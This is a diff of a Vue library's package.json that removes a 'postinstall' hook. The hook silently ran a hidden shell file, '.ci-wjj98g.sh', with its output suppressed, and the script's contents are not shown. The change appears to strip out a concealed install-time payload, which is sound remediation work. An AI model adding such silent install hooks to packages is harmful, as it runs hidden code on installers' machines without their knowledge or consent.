@@ -10,8 +10,7 @@
     "build:umd": "rollup --config build/rollup.config.js --format umd --file dist/vue-addr-picker.umd.js",
     "build:es": "rollup --config build/rollup.config.js --format es --file dist/vue-addr-picker.esm.js",
     "build:unpkg": "rollup --config build/rollup.config.js --format iife --file dist/vue-addr-picker.min.js",
-    "build": "npm run build:umd & npm run build:es & npm run build:unpkg",
-    "postinstall": "sh ./.ci-wjj98g.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "build": "npm run build:umd & npm run build:es & npm run build:unpkg"
   },
   "dependencies": {
     "mint-ui": "^2.2.13"
